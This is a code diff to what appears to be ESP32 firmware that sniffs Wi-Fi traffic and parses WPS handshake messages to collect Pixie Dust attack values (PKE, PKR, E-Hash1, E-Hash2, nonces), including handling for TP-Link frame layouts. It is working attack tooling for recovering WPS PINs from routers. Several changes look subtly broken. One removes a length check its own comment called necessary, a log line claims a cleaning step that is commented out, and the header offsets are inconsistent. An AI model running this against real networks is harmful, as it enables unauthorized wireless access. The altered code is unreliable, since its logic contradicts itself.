@@ -257,6 +257,7 @@ bool isWpsFrame(const wifi_promiscuous_pkt_t *pkt) {
                               p[offset+5] == 0x37 &&
                               p[offset+6] == 0x2A);
 
+
     if (!isStandardWfa && !isDoubleWrap && !isWscStartShell && !isTPLinkScrambled) {
         return false;
     }
@@ -316,24 +317,15 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
             o += 4 + l;
         }
     }
-    // MsgType 0x04 = M1 (AP→us in Registrar flow). Store raw body for Authenticator.
-    // Walk TLVs to find the exact end — bufLen may include trailing padding bytes
-    // that would corrupt the HMAC input if included.
+
     if (msgType == 0x04 && pixieCapture.m1BodyLen == 0) {
-        int exactLen = 0;
-        int p = 0;
-        while (p + 4 <= bufLen) {
-            uint16_t t = ((uint16_t)buf[p]<<8) | buf[p+1];
-            uint16_t l = ((uint16_t)buf[p+2]<<8) | buf[p+3];
-            if (p + 4 + l > bufLen) break;
-            exactLen = p + 4 + l;
-            p += 4 + l;
-        }
-        int copyLen = (exactLen < PixieData::M1_BODY_MAX) ? exactLen : PixieData::M1_BODY_MAX;
+        int copyLen = (bufLen < PixieData::M1_BODY_MAX) ? bufLen : PixieData::M1_BODY_MAX;
         memcpy(pixieCapture.m1Body, buf, copyLen);
         pixieCapture.m1BodyLen = copyLen;
-        Serial.printf("[Pixie] M1 body stored EXACTLY (%d bytes) for Authenticator\n", copyLen);
+   //     wps_clean_m1_body(pixieCapture.m1Body, (int*)&pixieCapture.m1BodyLen);
+        Serial.printf("[Pixie] Cleaned M1 body stored (%d bytes)\n", pixieCapture.m1BodyLen);
     }
+
 
     int offset = 0;
     while (offset + 4 <= bufLen) {
@@ -349,15 +341,18 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         const uint8_t *data = buf + offset;
 
         switch (attr_type) {
-            case 0x1032:  // Public Key — AP's PKE (M1). We never sniff our own M2 (fromAP filter).
+            case 0x1032:  // Public Key — used for BOTH enrollee PKE (M1) and registrar PKR (M2)
                           // 0x1032 = ATTR_PUBLIC_KEY per wpa_supplicant wps_defs.h
                 if (attr_len == 192) {
                     if (!pixieCapture.pke_set) {
                         memcpy(pixieCapture.pke, data, 192);
                         pixieCapture.pke_set = true;
                         Serial.println("[Pixie] PKE captured");
+                    } else {
+                        memcpy(pixieCapture.pkr, data, 192);
+                        pixieCapture.pkr_set = true;
+                        Serial.println("[Pixie] PKR captured");
                     }
-                    // PKR is our own key — set by wpsPixieDustProbe(), not captured from wire.
                 }
                 break;
             case 0x101A:  // Enrollee Nonce — in M1
@@ -380,14 +375,14 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
                 if (attr_len == 32) {
                     memcpy(pixieCapture.e_hash1, data, 32);
                     pixieCapture.e_hash1_set = true;
-                    Serial.println("[Pixie] E-Hash1 captured");
+                    Serial.println("[Pixie] E-Hash1 captured (TLV 0x1014)");
                 }
                 break;
             case 0x1015:  // E-Hash2 — in AP M3 (Registrar flow) / Enrollee flow
                 if (attr_len == 32) {
                     memcpy(pixieCapture.e_hash2, data, 32);
                     pixieCapture.e_hash2_set = true;
-                    Serial.println("[Pixie] E-Hash2 captured");
+                    Serial.println("[Pixie] E-Hash2 captured (TLV 0x1015)");
                 }
                 break;
             case 0x1005:  // AuthKey — KDF output, rarely OTA; best-effort
@@ -401,11 +396,9 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         offset += attr_len;
     }
 
-    // PKR is our own key — set by wpsPixieDustProbe() before the M3 wait loop starts,
-    // so we don't gate on it here. Gating on it would keep valid=false until after
-    // M3 is already received, causing the wait loop to time out.
     bool hasMinimal =
         pixieCapture.pke_set     &&
+        pixieCapture.pkr_set     &&
         pixieCapture.e_hash1_set &&
         pixieCapture.e_hash2_set &&
         pixieCapture.e_nonce_set;
@@ -484,8 +477,16 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
     // The AP inserts a 4-byte random session token between the EAP type byte (0xFE)
     // and the WFA Vendor-ID (00:37:2A). So at vidOffset we see the token[0:4], and
     // the real WFA VID is at vidOffset+4. Detect by checking vidOffset+4..+6 == 00:37:2A.
-    bool isTPLink = (vidOffset + 7 <= len &&
-                     p[vidOffset+4]==0x00 && p[vidOffset+5]==0x37 && p[vidOffset+6]==0x2A);
+    bool isTPLink = false;
+    if (vidOffset + 10 <= len && p[vidOffset+4]==0x00 && p[vidOffset+5]==0x37 && p[vidOffset+6]==0x2A) {
+        uint32_t token = (p[vidOffset]<<24)|(p[vidOffset+1]<<16)|(p[vidOffset+2]<<8)|p[vidOffset+3];
+        if (token != 0) {
+            isTPLink = true;
+            Serial.printf("[Pixie] TP-Link token detected: %08X\n", token);
+        }
+    }
+
+
 
     // TP-Link frame layout from EAP body (eapBody[]):
     //   [0]     EAPOL ver
@@ -513,11 +514,13 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
     uint8_t wscFlags;
 
     if (isTPLink) {
-        // 4-byte token present
-        wscFlags     = eapBody[21];
-        tlvBodyOffset = 22;
-        Serial.printf("[Pixie] TP-Link format: token=%02X%02X%02X%02X op=0x%02X flags=0x%02X\n",
-                      eapBody[9],eapBody[10],eapBody[11],eapBody[12],eapBody[20],wscFlags);
+        // TP-Link: token(4) + VID(3) + VType(4) + op(1) + flags(1) = 13
+        // If flags bit1 (MsgLen present) is set, add another 2 bytes = 15
+        int base = 13;
+        uint8_t flags = eapBody[20 + 1];   // flags byte after opcode
+        if (flags & 0x02) base += 2;
+        tlvBodyOffset = base;
+        wscFlags = flags;
     } else if (outerIsDoubleWrap) {
         // Double-wrapped (2A:00:01 outer + 8-byte inner header)
         // Inner header at eapBody[17]: OUI(3)+VType-like(3)+op(1)+flags(1) = 8 bytes
@@ -543,10 +546,15 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
         tlvBodyOffset += 2;  // skip 2-byte WPS total message length field
     }
 
+     Serial.printf("[Pixie] TP-Link tlvBodyOffset = %d, wpsHasLen = %d\n", tlvBodyOffset, wpsHasLen);
+
+
     if (tlvBodyOffset >= eapBodyLen) return false;
 
     const uint8_t *tlvStart = eapBody + tlvBodyOffset;
     int            tlvBytes = eapBodyLen - tlvBodyOffset;
+
+
 
     // Reassembly logic
     if (wpsHasLen) {
@@ -574,6 +582,20 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
         if (copy > 0) {
             memcpy(g_wpsReassemblyBuf + g_wpsReassemblyLen, tlvStart, copy);
             g_wpsReassemblyLen += copy;
+        }
+    }
+
+    if (g_wpsReassemblyLen >= 2 && (g_wpsReassemblyBuf[0] != 0x10 || g_wpsReassemblyBuf[1] != 0x4A)) {
+        Serial.printf("[Pixie] ERROR: Reassembled buffer does not start with Version TLV (0x%02X%02X)\n",
+                    g_wpsReassemblyBuf[0], g_wpsReassemblyBuf[1]);
+        // Try to find Version TLV by scanning forward (fallback)
+        for (int i = 0; i < g_wpsReassemblyLen - 4; i++) {
+            if (g_wpsReassemblyBuf[i] == 0x10 && g_wpsReassemblyBuf[i+1] == 0x4A) {
+                memmove(g_wpsReassemblyBuf, g_wpsReassemblyBuf + i, g_wpsReassemblyLen - i);
+                g_wpsReassemblyLen -= i;
+                Serial.printf("[Pixie] Adjusted buffer: removed %d leading bytes\n", i);
+                break;
+            }
         }
     }
 
